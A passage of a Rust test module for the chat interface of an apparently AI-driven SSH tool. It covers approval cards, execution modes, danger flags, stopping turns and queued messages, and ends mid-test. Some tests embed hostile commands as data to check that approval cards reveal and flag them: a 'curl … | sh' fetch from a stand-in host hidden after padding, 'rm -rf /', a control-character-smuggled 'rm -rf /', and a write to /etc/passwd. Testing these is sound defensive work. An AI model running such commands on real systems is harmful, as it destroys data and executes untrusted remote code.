        assert!(
            state.pending().is_none(),
            "只读命令在只读自动模式下直接执行"
        );
        let first = &assistant(&state).tools[0];
        assert_eq!(first.approval, ApprovalState::NotRequired);
        assert_eq!(first.status, ToolStatus::Running);

        advance_n(&mut state, 4, ExecMode::ReadOnly);
        let pending = state.pending().expect("写文件在只读自动模式下仍要确认");
        assert_eq!(pending.call_id, "call-2");
        assert_eq!(pending.tool, "write_file");
    }

    #[test]
    fn approving_both_tools_finishes_the_turn() {
        let mut state = started();
        advance_n(&mut state, 3, ExecMode::Manual);
        assert_eq!(state.pending().expect("等待第一条确认").call_id, "call-1");
        assert!(state.resolve_approval("call-1", true));
        assert!(state.pending().is_none());
        assert_eq!(assistant(&state).tools[0].approval, ApprovalState::Allowed);
        assert_eq!(assistant(&state).tools[0].status, ToolStatus::Running);

        advance_n(&mut state, 1, ExecMode::Manual);
        assert_eq!(
            assistant(&state).tools[0].output.as_deref(),
            Some("/srv/app")
        );
        assert_eq!(assistant(&state).tools[0].status, ToolStatus::Done);

        advance_n(&mut state, 3, ExecMode::Manual);
        assert_eq!(state.pending().expect("等待第二条确认").call_id, "call-2");
        assert!(state.resolve_approval("call-2", true));

        advance_n(&mut state, 1, ExecMode::Manual);
        assert_eq!(
            assistant(&state).tools[1].output.as_deref(),
            Some("已写入 12 字节")
        );
        assert_eq!(assistant(&state).tools[1].status, ToolStatus::Done);

        advance_n(&mut state, 2, ExecMode::Manual);
        assert!(!state.is_running());
        let message = assistant(&state);
        assert!(message.text.contains("目录是 /srv/app。"));
        assert!(message.text.contains("写入完成。"));
        assert!(!message.stopped);
        assert_eq!(message.tools.len(), 2);
    }

    #[test]
    fn denying_the_first_tool_cancels_the_turn() {
        let mut state = started();
        advance_n(&mut state, 3, ExecMode::Manual);
        assert!(state.resolve_approval("call-1", false));
        assert_eq!(assistant(&state).tools[0].approval, ApprovalState::Denied);
        assert_eq!(
            assistant(&state).tools[0].error.as_deref(),
            Some("用户拒绝执行")
        );

        advance_n(&mut state, 1, ExecMode::Manual);
        advance_n(&mut state, 1, ExecMode::Manual);
        advance_n(&mut state, 1, ExecMode::Manual);
        assert!(!state.is_running());

        let message = assistant(&state);
        assert!(message.text.contains("已取消。"));
        assert_eq!(message.tools.len(), 1);
        assert_eq!(message.tools[0].status, ToolStatus::Failed);
        assert_eq!(message.tools[0].error.as_deref(), Some("用户拒绝执行"));
    }

    #[test]
    fn denying_the_write_tool_reports_a_cancelled_write() {
        let mut state = started();
        advance_n(&mut state, 3, ExecMode::ReadOnly);
        advance_n(&mut state, 4, ExecMode::ReadOnly);
        assert_eq!(state.pending().expect("等待写文件确认").call_id, "call-2");
        assert!(state.resolve_approval("call-2", false));

        advance_n(&mut state, 1, ExecMode::ReadOnly);
        advance_n(&mut state, 1, ExecMode::ReadOnly);
        advance_n(&mut state, 1, ExecMode::ReadOnly);
        assert!(!state.is_running());

        let message = assistant(&state);
        assert!(message.text.contains("已取消写入。"));
        assert_eq!(message.tools[1].status, ToolStatus::Failed);
        assert_eq!(message.tools[1].error.as_deref(), Some("用户拒绝执行"));
    }

    #[test]
    fn pending_approval_never_ends_the_turn() {
        let mut state = started();
        advance_n(&mut state, 3, ExecMode::Manual);
        for _ in 0..10 {
            assert!(!state.advance(ExecMode::Manual));
            assert!(state.is_running());
            assert!(state.pending().is_some());
        }
        assert_eq!(
            assistant(&state).tools[0].status,
            ToolStatus::AwaitingApproval
        );
        assert_eq!(assistant(&state).tools[0].output, None);
    }

    #[test]
    fn stopping_resolves_pending_approval_and_marks_the_message_stopped() {
        let mut state = started();
        advance_n(&mut state, 3, ExecMode::Manual);
        assert!(state.pending().is_some());
        assert!(state.stop());

        assert!(!state.is_running());
        assert!(state.pending().is_none());
        let message = assistant(&state);
        assert!(message.stopped);
        assert_eq!(message.tools[0].approval, ApprovalState::Denied);
        assert_eq!(message.tools[0].status, ToolStatus::Stopped);
        assert_eq!(message.tools[0].error.as_deref(), Some("已停止"));
        assert!(!state.advance(ExecMode::Manual), "停止后脚本不能再推进");
    }

    #[test]
    fn reasoning_and_text_accumulate_into_one_assistant_message() {
        let mut state = started();
        assert!(state.advance(ExecMode::Auto));
        assert!(state.advance(ExecMode::Auto));
        let message = assistant(&state);
        assert_eq!(message.reasoning, "先确认当前目录，再决定是否写入。");
        assert_eq!(message.text, "我先看一下当前目录。");
        assert!(!message.reasoning_expanded);
        assert!(state.toggle_reasoning(1));
        assert!(assistant(&state).reasoning_expanded);
        assert!(state.toggle_reasoning(1));
        assert!(!assistant(&state).reasoning_expanded);

        for _ in 0..20 {
            if !state.advance(ExecMode::Auto) {
                break;
            }
        }
        assert_eq!(state.messages.len(), 2, "文本和思考都在同一条助手消息里");
        let message = assistant(&state);
        assert!(message.text.contains("目录是 /srv/app。"));
        assert!(message.text.contains("接下来写入配置文件。"));
        assert!(message.text.contains("写入完成。"));
        assert_eq!(message.reasoning.matches("先确认当前目录").count(), 1);
    }

    #[test]
    fn a_mode_change_only_affects_later_tool_calls() {
        let mut state = started();
        advance_n(&mut state, 3, ExecMode::Manual);
        assert_eq!(state.pending().expect("等待第一条确认").call_id, "call-1");

        // 待确认期间切到全部放行，不能把已经弹出来的确认撤掉。
        assert!(!state.advance(ExecMode::Auto));
        assert_eq!(state.pending().expect("确认还在").call_id, "call-1");

        assert!(state.resolve_approval("call-1", true));
        // 后续写文件按新切到的全部放行直接执行。
        advance_n(&mut state, 4, ExecMode::Auto);
        assert!(state.pending().is_none());
        let second = &assistant(&state).tools[1];
        assert_eq!(second.approval, ApprovalState::NotRequired);
        assert_eq!(second.status, ToolStatus::Running);
    }

    #[test]
    fn new_conversation_clears_messages_and_stops_the_script() {
        let mut state = started();
        advance_n(&mut state, 3, ExecMode::Manual);
        state.new_conversation();

        assert!(state.messages.is_empty());
        assert!(!state.is_running());
        assert!(state.pending().is_none());
        assert!(!state.advance(ExecMode::Manual));

        assert!(state.start_turn("再来一次"));
        assert_eq!(state.messages.len(), 2);
    }

    fn demo_write_detail() -> ApprovalDetail {
        ApprovalDetail::new(
            DemoInput::WriteFile {
                path: "/srv/app/app.conf",
                content: "mode=prod\n",
            }
            .approval_request(),
        )
    }

    #[test]
    fn write_approval_shows_path_and_the_full_content_as_a_diff() {
        let detail = demo_write_detail();
        let file = detail.request.file.as_ref().expect("write_file 有文件细节");
        assert_eq!(file.path, "/srv/app/app.conf");
        assert!(file.is_new);
        assert_eq!(file.diff.added, 1);
        assert!(
            file.diff
                .lines
                .iter()
                .any(|line| line.text.contains("mode=prod")),
            "差异里要有写入的内容"
        );
        assert!(
            detail.command_text().is_none(),
            "write_file 的细节在文件区，不重复显示 `write_file <路径>`"
        );
        assert_eq!(content_preview(&"x".repeat(200)).chars().count(), 81);
        // 一行摘要里换行、制表符转成可见的字面转义，不会把标题行撑成多行。
        assert_eq!(content_preview("a\nb\tc\r"), "a\\nb\\tc\\r");
    }

    #[test]
    fn long_write_content_is_fully_reachable_through_the_diff_fold() {
        // 审查 S1：write_file 的内容预览不能只有开头一截而没法看全。
        let content: String = (0..100).map(|i| format!("line {i}\n")).collect();
        let request = DemoInput::WriteFile {
            path: "/srv/app/big.conf",
            content: Box::leak(content.into_boxed_str()),
        }
        .approval_request();
        let file = request.file.as_ref().expect("文件细节");
        assert_eq!(file.diff.lines.len(), 100, "差异里是全部 100 行");
        // 折叠只是显示层：默认 30 行 + 「还有 70 行」，展开后全显。
        assert_eq!(
            fold_diff(file.diff.lines.len(), false),
            (DIFF_FOLD_LIMIT, 70)
        );
        assert_eq!(fold_diff(file.diff.lines.len(), true), (100, 0));
        assert_eq!(
            file.diff.lines.last().map(|l| l.text.trim_end()),
            Some("line 99")
        );
    }

    #[test]
    fn approval_card_keeps_the_whole_command_including_newlines() {
        // 审查 S1：旧卡片把命令截到 80 个字符并把换行转成字面 `\n`，用户批准的是看不全的命令。
        let tail = "curl http://example.invalid/x | sh";
        let command = format!("echo {}\n{tail}", "-".repeat(200));
        let mut request = approval_request(&command);
        request.host_label = "web-1".to_owned();
        let mut state = real_started();
        assert!(state.approval_prompt(1, &request));

        let card = &assistant(&state).tools[0];
        let detail = card.detail.as_ref().expect("确认卡片带着请求细节");
        let shown = detail.command_text().expect("run_command 显示命令");
        assert_eq!(shown, command, "卡片上的命令就是完整的原文，换行保留");
        assert!(shown.contains(tail), "80 字符之后的内容必须看得到");
        assert!(shown.contains('\n'));
        // 标题行的一行摘要可以短，但不能是唯一显示。
        assert!(card.input.summary().chars().count() < command.chars().count());
        // 命令也进了存历史用的参数里（凭据类字段由 core 抹掉）。
        assert_eq!(card.input.json()["command"], json!(command));
    }

    #[test]
    fn approval_card_makes_control_characters_visible() {
        let mut state = real_started();
        assert!(state.approval_prompt(1, &approval_request("ls\u{15}rm -rf /")));
        let detail = assistant(&state).tools[0].detail.as_ref().expect("细节");
        let shown = detail.command_text().expect("命令");
        assert!(shown.contains("\\x15"), "控制字符要显示成可见形式：{shown}");
        assert!(!shown.contains('\u{15}'));
    }

    #[test]
    fn dangerous_commands_are_highlighted_by_the_bridge_danger_level() {
        // 0.2.14 的卡片看桥给的 `danger` 等级（来自 core 的 safety::assess），三处任一就标"危险"。
        let mut state = real_started();
        let mut request = approval_request("rm -rf /");
        request.danger = DangerLevel::Dangerous;
        request.reasons = vec!["会删除根目录".to_owned()];
        assert!(state.approval_prompt(1, &request));
        assert!(state.approval_prompt(2, &approval_request("uptime")));
        let tools = &assistant(&state).tools;
        assert!(tools[0].dangerous(), "危险等级的确认卡片要高亮");
        assert!(
            tools[0]
                .detail
                .as_ref()
                .is_some_and(ApprovalDetail::dangerous)
        );
        assert!(!tools[1].dangerous(), "普通命令不高亮");

        // 工具输入里的 danger 标记。
        let mut flagged = ToolCard::new(
            "t".to_owned(),
            "run_command".to_owned(),
            ToolInput::Real {
                summary: String::new(),
                input: json!({ "command": "x", "danger": "dangerous" }),
            },
        );
        assert!(flagged.dangerous());
        // write_file 结果里的"写系统路径"提示（自动模式没有确认卡片也能看到）。
        flagged.input = ToolInput::Real {
            summary: String::new(),
            input: json!({ "path": "/etc/passwd" }),
        };
        assert!(!flagged.dangerous());
        flagged.output = Some("saved\ndanger: flagged as a system path (/etc)".to_owned());
        assert!(flagged.dangerous());
    }

    #[test]
    fn exec_mode_cycles_and_round_trips_through_the_database() {
        assert_eq!(next_mode(ExecMode::Manual), ExecMode::ReadOnly);
        assert_eq!(next_mode(ExecMode::ReadOnly), ExecMode::Auto);
        assert_eq!(next_mode(ExecMode::Auto), ExecMode::Manual);
        // 解析用的是 core 的 `ExecMode::from_setting`，没有第二份。
        assert_eq!(ExecMode::from_setting(Some("unknown")), ExecMode::Manual);
        assert_eq!(ExecMode::from_setting(None), ExecMode::Manual);
        assert_eq!(mode_setting(ExecMode::from_setting(Some("auto"))), "auto");
        assert_eq!(mode_label(ExecMode::ReadOnly), "只读自动");

        let db = Database::open_in_memory().expect("内存库");
        let (mode, error) = load_exec_mode(&db);
        assert_eq!(mode, ExecMode::Manual);
        assert!(error.is_none());

        save_exec_mode(&db, ExecMode::ReadOnly).expect("保存执行模式");
        assert_eq!(db.ai_exec_mode().expect("读回"), "readonly");
        assert_eq!(load_exec_mode(&db).0, ExecMode::ReadOnly);
    }

    #[test]
    fn demo_mode_changes_are_never_persisted() {
        // 审查 M2：离线演示里点「执行模式」只改内存里的演示模式，不能写设置库——
        // 设置库里的值是真实审批策略（工具桥每次执行前读它）。
        assert_eq!(
            next_mode_plan(false, ExecMode::Manual),
            (ExecMode::ReadOnly, false)
        );
        assert_eq!(
            next_mode_plan(false, ExecMode::ReadOnly),
            (ExecMode::Auto, false)
        );
        assert_eq!(
            next_mode_plan(true, ExecMode::Manual),
            (ExecMode::ReadOnly, true)
        );
    }

    // ---------------------------------------------------------------------
    // 真实模式：只测纯状态和纯函数，不起进程、不读环境变量、不连网络。
    // ---------------------------------------------------------------------

    fn real_started() -> ChatState {
        let mut state = ChatState::default();
        assert!(state.start_real_turn("看一下服务器"));
        state
    }

    fn approval_request(command: &str) -> ApprovalRequest {
        ApprovalRequest {
            scope: "0123456789abcdef".to_owned(),
            exec_id: "exec-1".to_owned(),
            target_id: "host-1".to_owned(),
            session_id: None,
            host_label: "web-1".to_owned(),
            command: command.to_owned(),
            danger: DangerLevel::Safe,
            reasons: Vec::new(),
            file: None,
        }
    }

    #[test]
    fn a_failed_start_takes_the_unstarted_turn_back_out_of_the_conversation() {
        let mut state = real_started();
        // real_started 已经开了一个回合（用户消息 + 空的助手消息）。
        assert_eq!(state.messages.len(), 2);
        state.discard_unstarted_turn();
        assert!(state.messages.is_empty(), "刚追加的一对要撤掉");
        assert!(!state.real_running);

        // 前面的对话不动，只撤这一轮；已经有内容的助手消息也不动。
        let mut state = ChatState::default();
        assert!(state.start_real_turn("第一句"));
        state.apply_agent_event(AgentEvent::TextDelta { text: "好".into() });
        state.apply_agent_event(AgentEvent::TurnEnd);
        assert!(state.start_real_turn("第二句"));
        state.discard_unstarted_turn();
        assert_eq!(state.messages.len(), 2, "只剩第一句和它的回复");
        assert!(state.start_real_turn("第三句"));
        state.apply_agent_event(AgentEvent::TextDelta {
            text: "半截".into(),
        });
        state.discard_unstarted_turn();
        assert_eq!(
            state.messages.len(),
            4,
            "有内容的助手消息不能被当成没开始的回合撤掉"
        );
    }

    #[test]
    fn real_text_and_reasoning_accumulate_into_the_active_message() {
        let mut state = real_started();
        assert!(state.is_running(), "真实回合不依赖演示脚本");

        state.apply_agent_event(AgentEvent::ReasoningDelta {
            text: "先看目录".to_owned(),
        });
        state.apply_agent_event(AgentEvent::TextDelta {
            text: "好的".to_owned(),
        });
        state.apply_agent_event(AgentEvent::TextDelta {
            text: "我看一下。".to_owned(),
        });

        let message = assistant(&state);
        assert_eq!(message.reasoning, "先看目录");
        assert_eq!(message.text, "好的我看一下。");
        assert!(state.is_running());

        state.apply_agent_event(AgentEvent::TurnEnd);
        assert!(!state.is_running());
        assert_eq!(state.messages.len(), 2, "正文都落在同一条助手消息里");
        assert!(!assistant(&state).stopped);
    }

    #[test]
    fn real_tool_start_and_end_update_one_card() {
        let mut state = real_started();
        state.apply_agent_event(AgentEvent::ToolStart {
            call_id: "toolu_1".to_owned(),
            tool: "run_command".to_owned(),
            input: json!({ "command": "uptime" }),
        });

        let card = &assistant(&state).tools[0];
        assert_eq!(card.call_id, "toolu_1");
        assert_eq!(card.tool, "run_command");
        assert_eq!(card.status, ToolStatus::Running);
        assert_eq!(card.approval, ApprovalState::NotRequired);
        assert!(card.input.summary().contains("uptime"));

        state.apply_agent_event(AgentEvent::ToolEnd {
            call_id: "toolu_1".to_owned(),
            tool: "run_command".to_owned(),
            output: "up 3 days".to_owned(),
            error: false,
        });
        let card = &assistant(&state).tools[0];
        assert_eq!(card.status, ToolStatus::Done);
        assert_eq!(card.output.as_deref(), Some("up 3 days"));
        assert!(card.error.is_none());

        state.apply_agent_event(AgentEvent::ToolStart {
            call_id: "toolu_2".to_owned(),
            tool: "run_command".to_owned(),
            input: json!({ "command": "false" }),
        });
        state.apply_agent_event(AgentEvent::ToolEnd {
            call_id: "toolu_2".to_owned(),
            tool: "run_command".to_owned(),
            output: "命令失败".to_owned(),
            error: true,
        });
        let card = &assistant(&state).tools[1];
        assert_eq!(card.status, ToolStatus::Failed);
        assert_eq!(card.error.as_deref(), Some("命令失败"));
        assert!(card.output.is_none());
    }

    #[test]
    fn real_approval_stays_pending_until_answered() {
        let mut state = real_started();
        let request = approval_request("rm -rf /tmp/build");
        assert!(state.approval_prompt(7, &request));

        let card = &assistant(&state).tools[0];
        assert_eq!(card.approval, ApprovalState::Pending);
        assert_eq!(card.status, ToolStatus::AwaitingApproval);
        assert_eq!(card.tool, "run_command");
        assert!(
            card.detail
                .as_ref()
                .and_then(ApprovalDetail::command_text)
                .is_some_and(|text| text.contains("rm -rf /tmp/build")),
            "确认卡片要显示命令原文"
        );
        assert_eq!(state.real_approval("approval-7"), Some(7));

        assert!(state.resolve_real_approval("approval-7", true, true));
        let card = &assistant(&state).tools[0];
        assert_eq!(card.approval, ApprovalState::Allowed);
        assert_eq!(card.status, ToolStatus::Answered);
        assert!(state.real_approval("approval-7").is_none());
    }

    #[test]
    fn turn_end_with_a_pending_approval_never_shows_done() {
        let mut state = real_started();
        assert!(state.approval_prompt(3, &approval_request("touch /srv/app.conf")));
        state.apply_agent_event(AgentEvent::TurnEnd);

        assert!(!state.is_running());
        let card = &assistant(&state).tools[0];
        assert_eq!(card.approval, ApprovalState::Denied);
        assert_eq!(card.status, ToolStatus::Failed);
        assert!(
            card.error
                .as_deref()
                .is_some_and(|error| error.contains("未确认")),
            "待确认在回合结束时必须看起来没完成：{:?}",
            card.error
        );
    }

    // ---------------------------------------------------------------------
    // V2-G10b：执行位置回报、分组、思考指示
    // ---------------------------------------------------------------------

    fn tool_start(call_id: &str, command: &str) -> AgentEvent {
        AgentEvent::ToolStart {
            call_id: call_id.to_owned(),
            tool: "mcp__zssh__run_command".to_owned(),
            input: json!({ "command": command }),
        }
    }

    fn tool_end(call_id: &str, output: &str) -> AgentEvent {
        AgentEvent::ToolEnd {
            call_id: call_id.to_owned(),
            tool: "mcp__zssh__run_command".to_owned(),
            output: output.to_owned(),
            error: false,
        }
    }

    fn exec_report(
        exec_id: &str,
        command: &str,
        target: &str,
        session: Option<&str>,
    ) -> ExecTargetReport {
        ExecTargetReport {
            scope: "s".to_owned(),
            exec_id: exec_id.to_owned(),
            tool: "run_command".to_owned(),
            key: command.to_owned(),
            target_id: target.to_owned(),
            session_id: session.map(str::to_owned),
            host_label: if target == "host-2" { "db-1" } else { "web-1" }.to_owned(),
        }
    }

    #[test]
    fn a_report_labels_the_card_and_the_result_marker_is_stripped() {
        let mut state = real_started();
        state.apply_agent_event(tool_start("c1", "uptime"));
        state.apply_report(exec_report("e1", "uptime", "host-1", Some("term-3")), true);
        let card = &assistant(&state).tools[0];
        let exec = card.exec.as_ref().expect("回报配到了卡片上");
        assert_eq!(exec.label, "web-1");
        assert_eq!(exec.session_id.as_deref(), Some("term-3"));
        assert!(card.exec_multi, "有多个目标：卡片上要标主机名");

        state.apply_agent_event(tool_end(
            "c1",
            "exit_code: 0\nlocation: terminal\nstdout:\nok\n[zssh exec e1]",
        ));
        let card = &assistant(&state).tools[0];
        let output = card.output.as_deref().expect("有输出");
        assert!(
            !output.contains("[zssh exec"),
            "卡片上不显示编号标记：{output}"
        );
        assert!(output.contains("location: terminal"));
        assert_eq!(card.status, ToolStatus::Done);
        assert!(!state.target_unknown(card), "配上了就不是「未确定」");
    }

    #[test]
    fn two_identical_commands_are_told_apart_by_the_exec_id_in_their_results() {
        let mut state = real_started();
        state.apply_agent_event(tool_start("web", "uptime"));
        state.apply_agent_event(tool_start("db", "uptime"));
        // 回报先到，按先后临时配：e1 → web，e2 → db。
        state.apply_report(exec_report("e1", "uptime", "host-1", None), true);
        state.apply_report(exec_report("e2", "uptime", "host-2", None), true);
        let labels = |state: &ChatState| -> Vec<String> {
            assistant(state)
                .tools
                .iter()
                .map(|card| {
                    card.exec
                        .as_ref()
                        .map(|e| e.label.clone())
                        .unwrap_or_default()
                })
                .collect()
        };
        assert_eq!(labels(&state), vec!["web-1", "db-1"]);
        // db 先返回，结果里写着它其实是 e1：以编号为准，两张对调。
        state.apply_agent_event(tool_end("db", "stdout:\nx\n[zssh exec e1]"));
        assert_eq!(labels(&state), vec!["db-1", "web-1"]);
    }

    #[test]
    fn a_report_that_arrives_before_its_card_waits_and_stale_ones_are_dropped() {
        let mut state = real_started();
        state.apply_report(exec_report("e1", "uptime", "host-1", None), false);
        assert!(assistant(&state).tools.is_empty());
        state.apply_agent_event(tool_start("c1", "uptime"));
        assert_eq!(
            assistant(&state).tools[0]
                .exec
                .as_ref()
                .map(|e| e.exec_id.clone()),
            Some("e1".to_owned()),
            "卡片出现时认领先到的回报"
        );
        // 回合结束时没人认领的回报作废，不去认领下一回合同名的调用。
        state.apply_report(exec_report("e2", "df", "host-1", None), false);
        state.apply_agent_event(AgentEvent::TurnEnd);
        let mut state = state;
        assert!(state.start_real_turn("再来"));
        state.apply_agent_event(tool_start("c2", "df"));
        let last = match state.messages.last() {
            Some(ChatMessage::Assistant(message)) => message,
            _ => panic!("要有助手消息"),
        };
        assert!(
            last.tools[0].exec.is_none(),
            "上一回合遗留的回报不能认领这一回合的卡片"
        );
    }

    #[test]
    fn a_finished_call_without_any_report_says_the_target_is_unknown() {
        let mut state = real_started();
        state.apply_agent_event(tool_start("c1", "uptime"));
        assert!(
            !state.target_unknown(&assistant(&state).tools[0]),
            "还在执行：先别急着说未确定"
        );
        state.apply_agent_event(tool_end("c1", "exit_code: 0"));
        assert!(state.target_unknown(&assistant(&state).tools[0]));
        // 列表工具不带目标，不算。
        state.apply_agent_event(AgentEvent::ToolStart {
            call_id: "c2".to_owned(),
            tool: "mcp__zssh__list_targets".to_owned(),
            input: json!({}),
        });
        state.apply_agent_event(AgentEvent::ToolEnd {
            call_id: "c2".to_owned(),
            tool: "mcp__zssh__list_targets".to_owned(),
            output: "1 target(s)".to_owned(),
            error: false,
        });
        assert!(!state.target_unknown(&assistant(&state).tools[1]));
    }

    #[test]
    fn the_approval_card_already_knows_where_the_command_will_run() {
        let mut state = real_started();
        let mut request = approval_request("systemctl restart nginx");
        request.session_id = Some("term-2".to_owned());
        assert!(state.approval_prompt(9, &request));
        let card = &assistant(&state).tools[0];
        let exec = card.exec.as_ref().expect("审批请求自带执行位置");
        assert_eq!(
            (exec.label.as_str(), exec.session_id.as_deref()),
            ("web-1", Some("term-2"))
        );
        assert!(card.exec_multi);
    }

    #[test]
    fn waiting_and_running_cards_are_never_folded_into_a_group() {
        let mut state = real_started();
        state.apply_agent_event(tool_start("c1", "uptime"));
        state.apply_agent_event(tool_end("c1", "exit_code: 0\nstdout:\nok\n"));
        state.apply_agent_event(tool_start("c2", "df -h"));
        state.apply_agent_event(tool_end("c2", "exit_code: 2\nstdout:\n\n"));
        assert!(state.approval_prompt(1, &approval_request("rm -rf /tmp/x")));
        state.apply_agent_event(tool_start("c3", "rm -rf /tmp/x"));

        let message = assistant(&state);
        let views: Vec<_> = message.tools.iter().map(ToolCard::view).collect();
        assert!(views[1].failed, "退出码不是 0 算失败");
        assert!(!views[0].failed);
        let rows = agent_tools::group_calls(&views);
        // 前两张已完成的并成一组；等批准的确认卡片单独成卡；正在执行的只一行进行中。
        assert_eq!(
            rows,
            vec![
                ToolRow::Group(vec![0, 1]),
                ToolRow::Card(2),
                ToolRow::Progress(3),
            ]
        );

        // 回合在批准还没回答时结束：确认卡片被标成失败，不会显示成完成，更不会被折叠隐藏掉待批准状态。
        let mut stopped = real_started();
        assert!(stopped.approval_prompt(2, &approval_request("reboot")));
        assert_eq!(
            agent_tools::group_calls(
                &assistant(&stopped)
                    .tools
                    .iter()
                    .map(ToolCard::view)
                    .collect::<Vec<_>>()
            ),
            vec![ToolRow::Card(0)]
        );
        stopped.apply_agent_event(AgentEvent::TurnEnd);
        let card = &assistant(&stopped).tools[0];
        assert_eq!(card.status, ToolStatus::Failed);
        assert!(card.view().is_approval && card.view().failed);
    }

    #[test]
    fn thinking_shows_between_steps_and_not_while_text_or_a_command_is_moving() {
        let mut state = ChatState::default();
        assert!(!state.thinking_visible(), "没有回合");
        assert!(state.start_real_turn("你好"));
        assert!(state.thinking_visible(), "刚发出问题");
        state.apply_agent_event(AgentEvent::TextDelta {
            text: "我先看".to_owned(),
        });
        assert!(!state.thinking_visible(), "字在出");
        state.apply_agent_event(tool_start("c1", "uptime"));
        assert!(!state.thinking_visible(), "命令在跑");
        state.apply_agent_event(tool_end("c1", "exit_code: 0"));
        assert!(state.thinking_visible(), "命令结束，AI 在想下一步");
        assert!(state.approval_prompt(3, &approval_request("reboot")));
        assert!(!state.thinking_visible(), "等批准");
        state.apply_agent_event(AgentEvent::Retrying {
            attempt: 1,
            reason: "限流".to_owned(),
            next_in_secs: None,
        });
        assert!(state.retry.is_some());
        state.apply_agent_event(AgentEvent::TurnEnd);
        assert!(!state.thinking_visible());
        assert!(state.retry.is_none() && state.turn_started.is_none());
    }

    #[test]
    fn a_new_conversation_forgets_every_pairing_and_thinking_state() {
        let mut state = real_started();
        state.apply_agent_event(tool_start("c1", "uptime"));
        state.apply_report(exec_report("e1", "uptime", "host-1", None), true);
        state.apply_report(exec_report("e2", "never", "host-1", None), true);
        state.new_conversation();
        assert!(state.tracked.is_empty() && state.reports.is_empty() && state.unclaimed.is_empty());
        assert!(state.report_multi.is_empty() && state.last_item.is_none());
        assert!(!state.thinking_visible());
    }

    #[test]
    fn expired_real_approval_marks_the_card_failed() {
        let mut state = real_started();
        assert!(state.approval_prompt(5, &approval_request("uptime")));
        assert!(state.resolve_real_approval("approval-5", true, false));

        let card = &assistant(&state).tools[0];
        assert_eq!(card.approval, ApprovalState::Denied);
        assert_eq!(card.status, ToolStatus::Failed);
        assert!(card.error.is_some());
    }

    #[test]
    fn real_notices_are_visible_and_marked() {
        let mut state = real_started();
        state.apply_agent_event(AgentEvent::Retrying {
            attempt: 2,
            reason: "限流".to_owned(),
            next_in_secs: Some(3),
        });
        // 0.2.14：重试提示放在「思考中」旁边，不往消息里堆提示。
        let retry = state.retry.clone().expect("重试提示");
        let text = agent_tools::retry_text(&retry);
        assert!(text.contains("第 2 次") && text.contains("限流") && text.contains("3 秒"));
        assert!(assistant(&state).notices.is_empty());
        // 又出字了：重试成功，提示消失。
        state.apply_agent_event(AgentEvent::TextDelta {
            text: "好".to_owned(),
        });
        assert!(state.retry.is_none());
        state.apply_agent_event(AgentEvent::Error {
            message: "连接失败".to_owned(),
        });
        state.apply_agent_event(AgentEvent::ResumeFailed);

        let notices = &assistant(&state).notices;
        assert_eq!(notices.len(), 2);
        assert!(notices[0].error);
        assert!(notices[0].text.contains("连接失败"));
        assert!(notices[1].text.contains("续接"));
    }

    #[test]
    fn stopping_a_real_turn_does_not_need_a_script() {
        let mut state = real_started();
        state.apply_agent_event(AgentEvent::ToolStart {
            call_id: "toolu_1".to_owned(),
            tool: "run_command".to_owned(),
            input: json!({ "command": "sleep 60" }),
        });
        assert!(state.is_running());
        assert!(state.stop());

        assert!(!state.is_running());
        let message = assistant(&state);
        assert!(message.stopped);
        assert_eq!(message.tools[0].status, ToolStatus::Stopped);
        assert_eq!(message.tools[0].error.as_deref(), Some("已停止"));
    }

    // ---- V2-U1：回合进行中补充的消息（待发送队列） ----

    use std::time::{Duration, Instant};

    #[test]
    fn a_message_typed_while_the_turn_runs_waits_and_goes_out_when_it_ends() {
        let mut state = real_started();
        assert!(state.enqueue("补充一：看看内存").is_some());
        assert!(state.enqueue("补充二：再看磁盘").is_some());
        assert_eq!(state.queue.len(), 2);
        let now = Instant::now();
        assert_eq!(state.take_queue_to_send(now), None, "回合还在跑，不发");

        state.apply_agent_event(AgentEvent::TextDelta {
            text: "答复".to_owned(),
        });
        state.apply_agent_event(AgentEvent::TurnEnd);
        assert!(!state.is_running());
        assert_eq!(
            state.take_queue_to_send(now).as_deref(),
            Some("补充一：看看内存\n\n补充二：再看磁盘"),
            "回合结束后按顺序合并成一条"
        );
        assert!(state.queue.is_empty());
        // 合并出来的那条作为新一回合发出。
        assert!(state.start_real_turn("补充一：看看内存\n\n补充二：再看磁盘"));
        assert!(state.is_running());
    }

    #[test]
    fn nothing_is_queued_when_no_turn_is_running() {
        let mut state = ChatState::default();
        assert_eq!(
            state.enqueue("直接发"),
            None,
            "没在跑：调用方直接发，不排队"
        );
        assert!(state.queue.is_empty());
    }

    #[test]
    fn a_turn_that_ended_with_an_error_still_sends_the_queue() {
        let mut state = real_started();
        state.enqueue("出错之后再试");
        state.apply_agent_event(AgentEvent::Error {
            message: "模型报错".to_owned(),
        });
        state.apply_agent_event(AgentEvent::TurnEnd);
        assert_eq!(
            state.take_queue_to_send(Instant::now()).as_deref(),
            Some("出错之后再试")
        );
    }

    #[test]
    fn a_turn_that_ends_with_an_unanswered_approval_still_sends_the_queue() {
        let mut state = real_started();
        state.apply_agent_event(AgentEvent::ToolStart {
            call_id: "toolu_1".to_owned(),
            tool: "run_command".to_owned(),
            input: json!({ "command": "rm -rf /tmp/x" }),
        });
        state.enqueue("改成只读检查");
        state.apply_agent_event(AgentEvent::TurnEnd);
        assert!(state.take_queue_to_send(Instant::now()).is_some());
    }

    #[test]
    fn stopping_holds_the_queue_so_nothing_is_sent_by_itself() {
        let mut state = real_started();
        state.enqueue("补充");
        assert!(state.stop_by_user());
        assert!(!state.is_running());
        assert_eq!(state.queue.len(), 1, "留在队列里");
        assert_eq!(
            state.take_queue_to_send(Instant::now()),
            None,
            "点了停止：不自动发"
        );
        // 停止之后迟到的收尾事件也不会让它自己发出去。
        state.apply_agent_event(AgentEvent::TurnEnd);
        assert_eq!(state.take_queue_to_send(Instant::now()), None);
        // 用户明确点「现在发送」：放开之后才发。
        state.queue.release();
        assert_eq!(
            state.take_queue_to_send(Instant::now()).as_deref(),
            Some("补充")
        );
    }

    #[test]
    fn stopping_without_a_queue_leaves_no_hold_behind() {
        let mut state = real_started();
        assert!(state.stop_by_user());
        assert!(state.start_real_turn("再来一个"));
        state.enqueue("补充");
        state.apply_agent_event(AgentEvent::TurnEnd);
        assert!(
            state.take_queue_to_send(Instant::now()).is_some(),
            "停止时队列是空的，不留扣住的痕迹"
        );
    }

    #[test]
    fn interrupt_stops_the_turn_and_waits_for_the_old_turn_end_before_sending() {
        let mut state = real_started();
        state.apply_agent_event(AgentEvent::TextDelta {
            text: "旧回合的开头".to_owned(),
        });
        state.enqueue("打断：改查网络");
        let start = Instant::now();
        assert!(state.queue_can_interrupt());
        assert!(state.interrupt_for_queue(start));
        assert!(!state.is_running(), "走的是和「停止」同一条状态路径");
